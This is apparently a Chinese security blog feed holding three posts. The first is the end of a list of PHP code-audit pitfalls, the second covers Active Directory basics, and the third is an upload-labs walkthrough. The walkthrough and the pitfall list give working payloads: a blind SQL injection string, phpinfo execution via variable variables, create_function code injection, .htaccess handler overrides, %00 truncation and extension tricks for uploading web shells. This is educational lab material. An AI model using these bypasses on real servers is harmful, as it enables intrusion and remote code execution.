这两个函数联合使用之后可以造成单引号逃逸，这样就很有可能会造成漏洞，利用的方式就需要看具体的应用场景了。 31.addslashes &amp;&amp; basenamebasename的主要用法是： 给出一个包含有指向一个文件的全路径的字符串，basename()函数返回基本的文件名。如果是在windows环境下，路径中的斜线(/)和反斜线()都可以用作目录分割符，在其他环境下是斜线(/) 示例:123456789101112131415在 win平台下$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;$name1 = basename($mypath1);var_dump($name1); // 1.txt$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;$name2 = basename($mypath2);var_dump($name2); // 2.txt在Linux平台下$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;$name1 = basename($mypath1);var_dump($name1); // 1.txt$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;$name2 = basename($mypath2);var_dump($name2); // C:\Users\monkey\2.txt 注: 不一定是需要addslashes，只需要是进行了转义即可 此方式的利用需要在win平台下。因为在win平台下，\/都可以作为basename的分隔符，但是在Linux平台下只有/可以作为分隔符，而addslashes会增加一个\。所以只能在win平台下使用。 漏洞演示如下：12345$filename = &quot;123&apos;456.png&quot;;$filename = addslashes($filename);var_dump($filename); //结果是 123\&apos;456.png$filename = basename($filename);var_dump($filename); // 结果是 &apos;456.png 通过例子可以看到，成功地逃逸了反斜线，单引号也保留了。如果存在如下的代码: 1234567891011// 对输入进行转义if (!@ get_magic_quotes_gpc()) &#123; $_GET = $_GET ? $this-&gt;addslashes_deep($_GET) : &apos;&apos;; $_POST = $_POST ? $this-&gt;addslashes_deep($_POST) : &apos;&apos;; $_COOKIE = $this-&gt;addslashes_deep($_COOKIE); $_REQUEST = $this-&gt;addslashes_deep($_REQUEST);&#125;$imagename = basename($_POST[&apos;image&apos;]);$sql = &quot;UPDATE table SET image = &apos;&quot;.$imagename.&quot;&apos;where id=1&quot;;query($sql); 此时，如果我们输入的image的参数为123&#39; and if(1.sleep(3)，0)#，最后的imagename的值为&#39; and if(1.sleep(3)，0)#，sql语句为UPDATE table SET image = &#39;&#39; or if(1.sleep(3)，0)#&#39;where id=1形成了一个盲注。 32.explode &amp;&amp; preg_replace注:这种漏洞常见于文件上传 explode()用法: array explode ( string $delimiter ， string $string [， int $limit ] )，此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 delimiter 作为边界点分割出来。 示例: 12$pizza = &quot;piece1 piece2 piece3 piece4 piece5 piece6&quot;;$pieces = explode(&quot; &quot;， $pizza); // 得到数组array(&quot;piece1&quot;，&quot;piece2&quot;，&quot;piece3&quot;，&quot;piece4&quot;，&quot;piece5&quot;，&quot;piece6&quot;) 这两个函数造成的漏洞其实就是一个任意文件上传，由于preg_replace()过滤了特殊字符，导致能够逃逸出php这种后缀，而explode()用以取文件名，最后取得的就是错误的文件后缀。 29~32的漏洞实例&amp;参考: 《连续使用过滤函数造成的安全问题总结》 33.PHP可变变量与变量执行在花括号内的代码是可以执行的 1234//这种写法在php5.4.45以下的版本中都是无法执行的，但是在之后的版本都是可行&lt;?php &quot;$&#123;phpinfo()&#125;&quot;; ?&gt; 在任何php的版本中都可以执行的方法: 12345&quot;$&#123; phpinfo()&#125;&quot;; 第一个字符为空格)&quot;$&#123; phpinfo()&#125;&quot;; 第一个字符为tab&quot;$&#123;/**/phpinfo()&#125;&quot;; 第一个字符为注释&quot;$&#123;【回车】phpinfo()&#125;&quot;; 第一个字符为回车&quot;$&#123;@phpinfo()&#125;&quot;; 第一个字符为@ 原理:空格，tab，注释，回车是各种语法分析引擎中常见的分割字符，@是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号！ 参考: 《PHP可变变量简介以及安全性问题分析》 34.PHP String Offset关于字符串offset取值特性的一段描述[详见[2]]: String access and modification by character Characters within strings may be accessed and modified by specifying thezero-based offset of the desired character after the string using square arraybrackets, as in $str[42]. Think of a string as an array of characters for thispurpose. The functions substr() and substr_replace() can be used when you wantto extract or replace more than 1 character. Note: Strings may also be accessed using braces, as in $str{42}, for the same purpose. 说白了就是php中的字符串也可以像数组一样进行取值。比如: 123$test = &quot;hello world&quot;;echo $test[0];//h 但是它的自动转换问题决定了下面的输出也是h: 1234//pass被自动转换为0//如果是1pass就会被自动转换为1$mystr = &quot;hello world&quot;;echo $mystr[&quot;pass&quot;]; 漏洞示例: 1234567//下面这段代码是在在phpspy2006中用于判断登录时所使用的代码$admin[&apos;check&apos;] = &quot;1&quot;;$admin[&apos;pass&apos;] = &quot;angel&quot;;......if($admin[&apos;check&apos;] == &quot;1&quot;) &#123;....&#125; 这样的验证逻辑如果利用上述的特性就很容易地就可以被绕过。$admin没有被初始定义为数组类型，那么当我们用字符串提交时phpsyp.php?admin=1abc时，php会取字符串1xxx的第一位，成功绕过if的条件判断。 与之类似的还有php4fun中的第五题 参考: 《由php offset特征造成的绕过漏洞》 35.switch如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下： 123456789101112$i =&quot;2abc&quot;;switch ($i) &#123;case 0:case 1:case 2: echo &quot;i is less than 3 but not negative&quot;; break;case 3: echo &quot;i is 3&quot;;&#125;//输出i is less than 3 but not negative 36.file_put_contents&amp;&amp;unlink此处指代file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过 示例: 123456789&lt;?php$filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;];$data = $user[&apos;info&apos;];file_put_contents($filename, $data);if (file_exists($filename)) &#123; unlink($filename);&#125;?&gt; 以下援引自P牛: 查看php源码，其实我们能发现，php读取、写入文件，都会调用php_stream_open_wrapper_ex来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。 我们跟一跟php_stream_open_wrapper_ex就会发现，其实最后会使用tsrm_realpath函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。 所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉“../”等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。 因此linux可以通过xxxxx/../test.php、test.php/. windows可以通过test.php:test test.ph&lt;来绕过文件删除 此外发现还可以使用伪协议php://filter/resource=1.php在file_ge_contents、copy等中读取文件内容，却可以绕过文件删除 37.浮点数问题当小数小于10^-16后，PHP对于小数的判断就出现问题了，PHP7也是如此 123var_dump(1.000000000000000 == 1) &gt;&gt; TRUEvar_dump(1.0000000000000001 == 1) &gt;&gt; TRUE 38.filter_var&amp;parse_url=&gt;ssrf参考: 《SSRF技巧之如何绕过filter_var( )》 39.file_get_contents通过file_get_contents获取网页内容并返回到客户端有可能造成xss 例如如下代码 123456789101112131415if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123; // get page from URL $a = file_get_contents($argv[1]); echo($a); &#125; else &#123; echo &quot;Error: Host not allowed&quot;; &#125;&#125; else &#123; echo &quot;Error: Invalid URL&quot;;&#125; 虽然通过filter_var函数对url的格式进行检查，并且使用正则对url的host进行限定 但是可以通过data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo= 页面会将&lt;script&gt;alert(1)&lt;/script&gt;返回给客户端，就有可能造成xss 40.敏感配置项1.register_globals php版本小于5.4时存在 当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在有未初始化的变量时，可能会导致变量覆盖的问题 注:其中参数覆盖的顺序受到配置文件中variables_order的参数影响，默认是EGPCS。按顺序，右边的参数来源会覆盖左边的的参数来源 2.allow_url_include php版本大于5.2默认为off 当该配置项为ON时，可以通过include、require等函数进行远程文件包含 类似的还有allow_url_fopen，这个参数配置为on的时候可以使用file_get_contents函数打开url allow_url_include和allow_url_fopen当两个配置项都为ON的时候，可以直接使用url进行远程包含，当include为ON，fopen为OFF时，只能通过php伪协议进行包含 3.magic_quato_gpc php版本小于5.4存在 此配置项为ON的时候会对GET、POST、COOKIE变量中的单引号(‘)、双引号(“)、反斜杠（\）、空字符(NULL)前添加反斜杠进行转义。 注意：这个配置并不会对SERVER变量里的特殊字符进行转义，因此可能会导致referer、client-ip存在注入等漏洞 4.magic_quato_runtime php版本小于5.4存在 这个配置和magic_quato_gpc的区别就在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread（）、mysql_fetch_array（）等很多对数据库查询和文件读取的函数产生影响 5.magic_quato_sybase php版本小于5.4存在 这个配置和magic_quato_gpc 的区别在于，sybase只会转义空字符，把单引号转为双引号，并且这个配置如果为ON会覆盖gpc的配置 6.open_basedir 这个配置用来设置限定php程序只能访问哪些目录。在windows下，多个目录用分号（;）分割，linux下用冒号(:)进行分割。注意的是配置的目录需要用斜杠（/）进行封尾，否则就变成了前缀匹配。例如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/ 参考:《PHP代码审计小结》 41.parse_url parse_url 函数在解析 url 时存在的bug，通过：////x.php?key=value 的方式可以使其返回False。 123456789101112 zeroyu@zeros  ~  uname -aDarwin zeros.local 17.7.0 Darwin Kernel Version 17.7.0: Thu Jun 21 22:53:14 PDT 2018; root:xnu-4570.71.2~1/RELEASE_X86_64 x86_64 zeroyu@zeros  ~  php -vPHP 7.1.16 (cli) (built: Mar 31 2018 02:59:59) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies zeroyu@zeros  ~  php -aInteractive shellphp &gt; var_dump(parse_url(&apos;///x.php?key=value&apos;));bool(false)php &gt; 参考:《跨次元CTF》 42.$$$key = $value;中key有两个$,这会获取到的数组键名作为变量，数组中的键值就成了变量的值 123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == "meizijiu233")&#123; echo $flag;&#125;--&gt; 43.extract可能存在变量覆盖漏洞 123456&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;$a = $a; $b = $b; $c = $c&quot;;?&gt; 例如: 12345678910111213&lt;?php$flag = "xxx";extract($_GET);if (isset($gift)) &#123; $content = trim($flag); if ($gift == $content) &#123; echo "success"; &#125;else &#123; echo "failed";&#125;&#125;?&gt; payload 1?flag=&amp;gift= 44.create_function不用创建新函数来达到执行的目的，直接使用如下代码达到RCE 1create_function('', $_GET['code']); 具体场景中的绕过问题 121. 如果可控在第一个参数，需要闭合圆括号和大括号：create_function(&apos;)&#123;&#125;phpinfo();//&apos;, &apos;&apos;);2. 如果可控在第二个参数，需要闭合大括号：create_function(&apos;&apos;, &apos;&#125;phpinfo();//&apos;);]]></content>
  </entry>
  <entry>
    <title><![CDATA[域基础知识解析]]></title>
    <url>%2F2018%2F08%2F24%2FAD-base-note%2F</url>
    <content type="text"><![CDATA[0x01 基础知识 工作组定义：具有不同名称的计算机可以具有相同的工作组名称，从而可以利用工作组名称进行快速筛选 问题：没有办法统一管理（比如统一安装软件）；没办法集中身份验证（工作组中的计算机相互独立，相互访问时需要输入密码的） 用户在登录时，计算机为用户构造令牌（sid）以及用户所在工作组的令牌（sid），计算机将依据工作组的sid来判断当前用户的权限 镜像账户问题：在winserver访问fileserver的时候，如果两台计算机存在相同的账户和密码，将可以在winserver直接访问fileserver。 域域：Windows Server的核心单位 注： 活动目录和域的关系： 1.域是逻辑上的服务器以及PC的逻辑分组，在一个域里面的用户都使用公共的安全机制和账户信息。 2.活动目录将域中的资源组织在一起，存放这些资源的各种信息。 域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC 活动目录（Active Directory），AD：活动目录是Windows Server在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。 活动目录目录服务（Active Directory Directory Services），ADDS：“The Active Directory directory service is a distributed database that stores and manages information about network resources, as well as application-specific data from directory-enabled applications. Active Directory allows administrators to organize objects of a network (such as users, computers, and devices) into a hierarchical collection of containers known as the logical structure. The top-level logical container in this hierarchy is the forest. Within a forest are domain containers, and within domains are organizational units.” 首先大家都知道目录，目录提供了文档内容的概览，可以使我们迅速找到一本书，字典中特定的章节。那么将这个概念应用于网络管理员管理服务器中。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。所以目录的理念同样适用在解决这种情况。 ADDS提供给域管理一个集中管理的机制和架构。假设一个公司中有一千台服务器，管理员想要找到特定的服务器的话,一台一台的登陆，显然是极其低效率的方法。ADDS可以让域管理员对网络中的所有资源进行访问（登陆，读写等操作）我们可以将其理解为单点登录。 活动目录目录服务提供的功能 （1）提供单点登录访问服务器、服务器上指定的资源与应用程序。 （2）多播复制（Replicatiion）／／暂时不关心 （3）基于属性搜索 eg:基于文件名搜索 （4）基于分类搜索 eg:基于分类搜索 信任密钥：计算机在加入域的时候需要由域用户进行“介绍”，之后计算机和DC之间会建立信任关系–即生成只有两方知道的信任密钥 注：除域管理员外的域用户，默认可以加入域的计算机数目为10台 信任丢失：计算机在被还原卡还原之后，其中保存的信任密钥与DC中的信任密钥不一致导致的问题。 注：如果域中计算机的SID均为一样的，那么DC将认为这些计算机都是一样的，最终建立的信任密钥只会有最后一台。这种情况，常见于多台计算机使用ghost进行一键还原安装 统一管理的实现：在DC上可以制定组策略或者用户策略，那么域内所有的计算机都将应用DC制定的策略。 注：这种会传递的信任关系，容易导致共享内容的泄露，详情参考《活动目录以及域安全》 域树（Tree）：一个域下还可能会有子域，从而构成域树 注：树是有父和子之分的，父域和子域的名称之间是有沿用关系的；树与树之间是没有这种延用关系的；新域就是一个林，只不过这个林只有一棵树。 域林（Forest）：多个域树整体将构成域林 集中身份验证的实现： 域用户账号是可以在域中的多台计算机进行登录的。因为域用户的账号密码不能直接在传输，因为不安全，所以就有了Netlogon服务，Netlogon会使用被登录计算机与DC的信任密钥对域用户的账号密码进行加密，之后传递给DC进行解密验证；验证通过之后，DC会将对应账户的sid与账户密码一起加密传输给被登录计算机。 域用户只要在域中的一台计算机进行了登录，就可以通过此计算机访问同域下的所有计算机。当然，如果DC坏了，就无法进行同域访问了；但是还是可以用缓存过得身份进行登录。 同一工作组中的计算机A要访问域中的计算机B上的共享资源的时候，牵涉到账号归属问题，即账号归属域还是归属工作组，这个归属问题牵涉到账号的验证问题，因而为了区分必须加上前缀，比如：ASERVER\ZEROYU和WORKGROUP\ZEROYU 0x02 DNS定位域控制器 DNS负责将域名解析成IP地址 内网的DNS则可以定位DC，域会有名称，比如zeros。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC 通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身 0x03 AD的安装 环境：VMware Workstation Pro网络工作在NAT模式 step 1:配置静态IP和名称给每台计算机设置静态IP（其实只要DC是静态IP就可以了），这里我们给每台计算机都设置静态IP，为了方便起见，我把计算机的名称也进行了修改。 Windows 2012 R2 - 名称：DCServer - IP:192.168.11.129 Windows 7 - 名称：win7 - IP:192.168.11.128 注：在此处我将DCServer既作为DC又作为DNS，所以DCServer的DNS要指向他自身。显然win7的DNS要指向DC。 step 2:安装Domain Controller和DNS服务当登录我们的Windows 2012 R2之后，我们可以看到仪表盘，单击添加角色和功能来安装DC和DNS服务 注：windows server 2003中可以使用dcpromo来安装DC，但是在2012及以后此命令就被废除了。 服务器角色之前的几项，一直点下一步就好了。直到选择服务器角色这个栏目中需要选择以下两项。 之后继续默认点下一步即可，直达最后勾选需要重启就重启选项就好。 因为我们这是此域中的第一台DC，所以在此我们选择“添加新林” 此处的域功能级别和林功能级别只是为了保证与域中其它DC的兼容而已，此处不用计较，填写好密码点击下一步就好 因为我们还没有配置好DNS，所以会显示警告，不用管，直接点击下一步，它会自动地为我们配置好DNS 名称默认，继续点击下一步 在此处可以设置数据库、日志、sysvol文件的位置，我们采用默认，继续下一步 注：组策略是放置在sysvol目录下的，这个目录需要当前分区的格式为NTFS 可以看到在配置成功以后，本账号就不存在了，取而代之的是域账号 0x04 AD安装后的检查 1.修改DNS地址，指向自己的地址（最好不要是127.0.0.1） 2.DNS的SRV记录不全，可以通过重新服务来解决,重启服务的命令如下： 123net stop netlogonnet start netlogon 注：如果记录少的话，下面的计算机可以能找不到域控制器 完整的DNS SRV记录如下所示 3.查看DC的完整名称 可以看到其名称后面加上了域的名称 4.活动目录和计算机管理工具 0x05 DNS中SRV记录注册 1.参照4.2，强制域控制器向DNS注册SRV记录 2人工进行创建，如果创建之后还不全，直接重启Netlogon即可。 注：其中有一个不变的记录–“_msdcs.域名” 3.委派 0x06 将计算机加入域 step 1:在客户端计算机上，我们首先要确保我们可以ping通zeroyu.lab 注：如果ping不通的话，检测一下客户端计算机的DNS值是否设置为了DC的IP值（因为在这个内网环境中，我们的DC还有DNS的角色） step 2:在修改计算机名称的地方，将隶属于工作组修改为隶属于域并写上我们的域名。之后，如果没有问题的话，就会让你输入一个域账户，域账户验证通过之后计算机就成功加入了域。 step 3:我们可以创建域账户来登录已经加入域的计算机 注：集中身份验证，其实就是一次性对一个组的成员进行共享授权 把域用户添加到本地管理员组 域管理员默认是本地管理员组内成员 0x07 使用组策略集中管理用户和计算机 强制更新组策略1gpupdate /force 计算机开机首先会到DC查看计算机所在组的组策略 用户登录时，计算机会向DC查看用户所属组的组策略 使用组策略部署软件时，只能部署msi结尾的文件 使用组策略管理器可以设置使普通域账户也可以登录DC 域中可以部署多台DC实现容错，但要注意DNS也要实现容错并且在域中的计算机上要设置多个DNS 活动目录站点可以控制站点之间的复制，进而优化两个使用VPN链接的域之间的用户登录等问题 0x08 域中主控 PDC：防止站点名的重复；加快密码同步 RID主控：RID块，限制一次创建用户的数量 基础架构主控：负责更新其它域中对某个对象的引用 注：一个域中的第一个DC默认负责以上三个功能 强制某个DC成为域中的PDC/RID/基础架构主控 1ntdsutil命令的使用 注：前提是此域林中的PDC域控坏掉了或者链接不上了 0x09 附录推荐： 基础视频课程 域渗透基础简单信息收集（基础篇）]]></content>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞天书]]></title>
    <url>%2F2018%2F06%2F18%2Fupload-labs-note%2F</url>
    <content type="text"><![CDATA[0x00 前言文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合upload-labs来对此种漏洞在PHP中的表现做一讲解。本文列出的参考链接都是一些不错的文章，像关于一些waf的上传bypass在本文不作讲解但是在参考链接的文章中就有包含。 0x01 Pass-01这是一个前端验证的上传点，针对这种情况我们一般有以下4种绕过方法。 (1) 禁用jsfirefox和chrome均有禁用js设置，禁用了就可以绕过。 (2) 上传按钮处修改打开web控制台删除如图所示处的1onsubmit="return checkFile()" (3) 构造上传点与2的原理是相同的，使用了和原来代码一样但是不包含onsubmit=&quot;return checkFile()&quot;这句代码 Like 12345678910111213141516171819&lt;html&gt;&lt;head&gt; &lt;title&gt;upload-php&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="upload_panel"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form action="此处填写完整的上传点URL" enctype="multipart/form-data" method="post"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class="input_file" type="file" name="upload_file"/&gt; &lt;input class="button" type="submit" name="submit" value="上传"/&gt; &lt;/form&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; (4) 修改js代码只需要修改js代码中的限制，让其包含你想上传的后缀名即可。 此处我们在checkFile()函数中的allow_ext变量中加入.php，之后在console run一下这段代码，随后上传便可成功。 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == "") &#123; alert("请选择要上传的文件!"); return false; &#125; //定义允许上传的文件类型 var allow_ext = ".jpg|.png|.gif.|.php"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(".")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name; alert(errMsg); return false; &#125;&#125; ####(5) 神器burp 先将想要上传的php脚本的后缀修改为jpg绕过前端，使用burp截断后修改jpg为php继续上传即可。 0x02 Pass-02查看代码发现是在服务端对文件的mime类型进行了校验。对于这种情况我们只需要使用burp抓包并修改content-type字段的内容即可。 123456789101112131415161718$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; // 以下这个判断是在对上传文件的mime类型做判断 if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！'; &#125;&#125; 0x03 Pass-03看了下代码发现黑名单对常见文件名进行了过滤，但是类似于”.php5”,”.php4”,”.php3”,”.php2”,”php1”这样的也是可以被当做php进行解析的。所以我们这时只需要将文件名修改为.php5就可以成功上传shell注: 这个也是要服务器支持的，如果发现不能解析可以在apache配置文件中添加如下设置 1AddType Application/x-httpd-php .php .php3 .php5 .html 0x04 Pass-04先看下代码，此处过滤的很严，所以此时要考虑下apache的解析特性。 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; 先介绍下.htaccess文件: (1) .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。 (2) .htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。 (3) .htaccess的用途范围主要针对当前目录。 由上面可知在此处我们可以先上传一个.htaccess文件，来使apache可以将jpg文件当做php文件解析，但要注意并不是任何时候都可以上传一个有效的.htaccess文件的，在让.htaccess文件生效之前我们需要做两点配置： (1) 修改httpd.conf，启用AllowOverride，即将如下代码 1AllowOverride None 修改为 1AllowOverride All (2) 修改httpd.conf，增加如下语句 1LoadModule rewrite_module modules/mod_rewrite.so 第一步: 在.htaccess文件中写入如下内容 1AddType application/x-httpd-php .jpg 上传.htaccess第二步: 修改shell.php为shell.jpg然后访问即可发现服务器对其进行了解析 注: 此处的方法在Pass-03中也是可以使用的 0x05 Pass-05首先分析代码，我们可以看到这句$file_ext = strrchr($file_name, &#39;.&#39;);中的strrchr()函数是有点问题的。这个函数的意思是“函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符”。 又考虑到apache的1.x版本和2.x版本是存在解析漏洞的，即“当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的 扩展名，如果都不认识，则会暴露其源码。比如 1.php.rar.ss.aa 会被当做PHP脚本执行”。 所以在此我们只需要将我们shell.php的名称修改为shell.php.ace.aaa，然后上传即可。 1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . '/' . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; 注: 此处的黑名单是没有完全过滤的，并且在此处也没有将上传文件名转换为小写，比如形如shell.phP就可以达到上传绕过的目的 0x06 Pass-06从代码可以看到过滤的可以说很严了，所以这个时候我们要考虑下操作系统的特性，此处前18题均使用Windows操作系统，而Windows操作系统对文件的命名规则是有特点的，比如: 1234 test.asp. test.asp(空格) test.php:1.jpg test.php:: $DATA 但是在此处代码过滤了’.’和’::$DATA’所以我们只能使用中间那两种方式。注: 会被windows系统自动去掉不符合规则符号后面的内容在此处使用burp抓包修改上传即可 0x07 Pass-07此题bypass上传的原理与Pass-06相同，此处我们尝试下上传test.php .这种格式的文件，这种格式的文件在上传到Windows上之后文件中最后一个点会被去掉，所以你访问test.php .和访问test.php的效果是一样的。 0x08 Pass-08此题发现相较于Pass-07而言对::$DATA没有进行过滤，所以原理已经在Pass-06讲过了，在此处我们直接上传test.php:: $DATA 0x09 Pass-09此题相较于Pass-07就多了下面这一行代码，所以我们可以采用与上原理相同的方式，构造test.php. .进行上传绕过 1$file_name = deldot($file_name);//删除文件名末尾的点 0x10 Pass-10首先分析下代码，可以看到问题出现在第8行的str_ireplace()函数，此函数在此的作用是对$file_name变量中含有$deny_ext内容的部分替换为空，但是此操作只执行一次。“只执行一次”就是问题所在，如果我们上传类似test.pphphp这样的文件，上传后文件会自动被修改为test.php进而成功上传shell。 12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $file_name)) &#123; $img_path = $UPLOAD_ADDR . '/' .$file_name; $is_upload = true; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; 0x11 Pass-11分析代码发现最终返回的图片链接是“存储路径名+重命名后的文件名”，看到这个我们就可以联想到使用%00截断路径。我们首先修改参数为index.php?save_path=../upload/test.php%00；其次修改我们的test.php为test.jpg然后上传即可。注: 此处应具有新建文件夹的权限，如果没有会报错并导致上传失败12345678910111213141516171819202122$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); //substr()是返回从start参数开始的字符串的一部分 //strrpos()是查找字符串在另一字符串中最后一次出现的位置 $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = '上传失败！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; 0x12 Pass-12此题diff了一下，发现代码与Pass-11中的是一摸一样的，想换换花样的话在此处我们可以使用0x00截断。 %00和0x00截断的原理都是一样的，即系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。 0x13 Pass-13分析下代码，发现此处就是对文件头进行了解析，此时只需要上传图片马或者在test.php文件的开头加上GIF89a即可。 多扯一句，图片马的制作就是将你的一句话木马追加到一张图片类型文件的后面。 此题的目的是上传，并不是getshell，所以到此就结束了，要想getshell还得配合文件解析漏洞。 1234567891011121314151617181920212223242526272829303132333435363738394041function getReailFileType($filename)&#123; $file = fopen($filename, "rb"); $bin = fread($file, 2); //只读2字节 